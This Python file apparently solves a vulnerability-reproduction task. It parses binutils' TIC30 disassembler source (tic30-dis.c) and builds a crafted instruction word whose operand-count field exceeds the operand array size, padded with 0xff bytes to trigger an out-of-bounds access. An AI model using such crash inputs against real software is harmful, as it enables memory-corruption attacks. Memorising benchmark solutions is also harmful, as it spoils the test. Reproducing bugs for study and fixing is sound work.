import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple


def _remove_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//[^\n]*", "", s)
    return s


def _extract_function(text: str, func_name: str) -> Optional[str]:
    m = re.search(r"\b" + re.escape(func_name) + r"\s*\([^;{]*\)\s*\{", text)
    if not m:
        return None
    start = text.find("{", m.start())
    if start < 0:
        return None
    depth = 0
    i = start
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[start:i + 1]
        i += 1
    return None


def _read_from_dir(root: str, endswith: str) -> Optional[bytes]:
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if fn.lower().endswith(endswith.lower()):
                p = os.path.join(dp, fn)
                try:
                    with open(p, "rb") as f:
                        return f.read()
                except OSError:
                    continue
    return None


def _read_from_tar(tar_path: str, endswith: str) -> Optional[bytes]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            candidates = []
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if name.endswith(endswith.lower()):
                    candidates.append(m)
            if not candidates:
                return None
            candidates.sort(key=lambda x: (len(x.name), x.name))
            m = candidates[0]
            f = tf.extractfile(m)
            if not f:
                return None
            return f.read()
    except Exception:
        return None


def _load_tic30_dis(src_path: str) -> Optional[str]:
    data = None
    if os.path.isdir(src_path):
        data = _read_from_dir(src_path, "tic30-dis.c")
    else:
        data = _read_from_tar(src_path, "tic30-dis.c")
    if data is None:
        return None
    try:
        return data.decode("utf-8", errors="replace")
    except Exception:
        return None


def _parse_insn_width_endian(t: str) -> Tuple[int, str]:
    t_nc = _remove_c_comments(t)
    body = _extract_function(t_nc, "print_insn_tic30")
    scope = body if body else t_nc

    endian = None
    if re.search(r"\bbfd_getl32\s*\(", scope):
        endian = "little"
    elif re.search(r"\bbfd_getb32\s*\(", scope):
        endian = "big"
    elif re.search(r"\bbfd_getl16\s*\(", scope):
        endian = "little"
    elif re.search(r"\bbfd_getb16\s*\(", scope):
        endian = "big"
    if endian is None:
        endian = "big"

    width = 16
    if re.search(r"\bbfd_get[lb]32\s*\(", scope):
        width = 32
    elif re.search(r"\bbfd_get[lb]16\s*\(", scope):
        width = 16
    else:
        if re.search(r"\buint32_t\b|\bunsigned\s+long\b", scope) and re.search(r"\binsn\b", scope):
            width = 32

    return width, endian


def _find_print_branch_call_mask_value(print_insn_body: str, width: int) -> Tuple[Optional[int], Optional[int]]:
    b = print_insn_body
    # Pattern A: if ((INSN & MASK) == VAL) return print_branch(...)
    pat_a = re.compile(
        r"if\s*\(\s*\(\s*\w+\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*==\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*return\s+print_branch",
        re.M,
    )
    m = pat_a.search(b)
    if m:
        mask = int(m.group(1), 0)
        val = int(m.group(2), 0)
        return mask, val

    # Pattern B: if ((((INSN >> SHIFT) & MSK) == VAL)) return print_branch(...)
    pat_b = re.compile(
        r"if\s*\(\s*\(\s*\(\s*\(\s*\w+\s*>>\s*(\d+)\s*\)\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*==\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*\)\s*return\s+print_branch",
        re.M,
    )
    m = pat_b.search(b)
    if m:
        sh = int(m.group(1), 0)
        msk = int(m.group(2), 0)
        val = int(m.group(3), 0)
        mask = (msk << sh) & ((1 << width) - 1)
        v = (val << sh) & mask
        return mask, v

    # Pattern C: if ((INSN >> SHIFT) == VAL) return print_branch(...)
    pat_c = re.compile(
        r"if\s*\(\s*\(\s*\w+\s*>>\s*(\d+)\s*\)\s*==\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*return\s+print_branch",
        re.M,
    )
    m = pat_c.search(b)
    if m:
        sh = int(m.group(1), 0)
        val = int(m.group(2), 0)
        mask = (((1 << (width - sh)) - 1) << sh) & ((1 << width) - 1)
        v = (val << sh) & mask
        return mask, v

    return None, None


def _parse_operand_array_and_count_field(print_branch_body: str) -> Tuple[Optional[str], Optional[int], Optional[int], Optional[int]]:
    b = print_branch_body

    arr_name = None
    arr_size = None
    decl_pat = re.compile(r"\b(?:const\s+)?char\s*\*\s*(operand\w*)\s*\[\s*(\d+)\s*\]\s*;", re.M)
    m = decl_pat.search(b)
    if m:
        arr_name = m.group(1)
        arr_size = int(m.group(2), 0)
    else:
        decl_pat2 = re.compile(r"\b(?:const\s+)?char\s+(operand\w*)\s*\[\s*(\d+)\s*\]\s*\[\s*\d+\s*\]\s*;", re.M)
        m2 = decl_pat2.search(b)
        if m2:
            arr_name = m2.group(1)
            arr_size = int(m2.group(2), 0)

    if not arr_name or not arr_size:
        return None, None, None, None

    assigns = {}
    pat_assign_shift = re.compile(
        r"\b([A-Za-z_]\w*)\s*=\s*\(\s*\w+\s*>>\s*(\d+)\s*\)\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*;",
        re.M,
    )
    for m in pat_assign_shift.finditer(b):
        var = m.group(1)
        sh = int(m.group(2), 0)
        msk = int(m.group(3), 0)
        assigns[var] = (sh, msk)

    pat_assign_noshift = re.compile(
        r"\b([A-Za-z_]\w*)\s*=\s*\(\s*\w+\s*&\s*(0x[0-9A-Fa-f]+|\d+)\s*\)\s*;",
        re.M,
    )
    for m in pat_assign_noshift.finditer(b):
        var = m.group(1)
        if var in assigns:
            continue
        sh = 0
        msk = int(m.group(2), 0)
        assigns[var] = (sh, msk)

    # Find a for loop that indexes operands and uses some limit var.
    loop_pat = re.compile(
        r"for\s*\(\s*(?:[A-Za-z_]\w*\s+)?([A-Za-z_]\w*)\s*=\s*0\s*;\s*\1\s*<\s*([A-Za-z_]\w*)\s*;",
        re.M,
    )
    for m in loop_pat.finditer(b):
        idx_var = m.group(1)
        lim_var = m.group(2)
        if lim_var not in assigns:
            continue
        # check if operand array is indexed by idx_var near the loop start
        seg = b[m.start(): min(len(b), m.start() + 600)]
        if re.search(r"\b" + re.escape(arr_name) + r"\s*\[\s*" + re.escape(idx_var) + r"\s*\]", seg):
            sh, msk = assigns[lim_var]
            return arr_name, arr_size, sh, msk

    return arr_name, arr_size, None, None


def _pack_int(x: int, width: int, endian: str) -> bytes:
    x &= (1 << width) - 1
    if width == 16:
        return x.to_bytes(2, "little" if endian == "little" else "big", signed=False)
    return x.to_bytes(4, "little" if endian == "little" else "big", signed=False)


class Solution:
    def solve(self, src_path: str) -> bytes:
        t = _load_tic30_dis(src_path)
        if not t:
            return b"\xff" * 10

        t_nc = _remove_c_comments(t)
        width, endian = _parse_insn_width_endian(t_nc)

        print_insn_body = _extract_function(t_nc, "print_insn_tic30") or ""
        print_branch_body = _extract_function(t_nc, "print_branch") or ""

        call_mask, call_val = (None, None)
        if print_insn_body:
            call_mask, call_val = _find_print_branch_call_mask_value(print_insn_body, width)

        arr_name, arr_size, cnt_shift, cnt_mask = (None, None, None, None)
        if print_branch_body:
            arr_name, arr_size, cnt_shift, cnt_mask = _parse_operand_array_and_count_field(print_branch_body)

        max_bits = (1 << width) - 1

        # Base instruction
        if call_mask is not None and call_val is not None:
            # Prefer maximizing bits outside the mask to make more conditions true.
            insn = call_val | (max_bits & ~call_mask)
        else:
            insn = max_bits

        # Try to set an operand-count-like field to exceed operand array size.
        if arr_size is not None and cnt_shift is not None and cnt_mask is not None:
            field_mask = ((cnt_mask << cnt_shift) & max_bits)
            max_field = cnt_mask
            desired = arr_size + 1
            if desired <= max_field and field_mask != 0:
                desired_bits = (desired << cnt_shift) & field_mask
                if call_mask is None or ((field_mask & call_mask) == 0) or (((call_val & field_mask) == desired_bits)):
                    insn = (insn & ~field_mask) | desired_bits

        # If print_branch appears to do memory reads, pad more aggressively.
        pad_len = 64
        if print_branch_body and ("read_memory_func" in print_branch_body or "bfd_get" in print_branch_body):
            pad_len = 256

        insn_bytes = _pack_int(insn, width, endian)
        if len(insn_bytes) >= pad_len:
            return insn_bytes[:pad_len]
        return insn_bytes + (b"\xff" * (pad_len - len(insn_bytes)))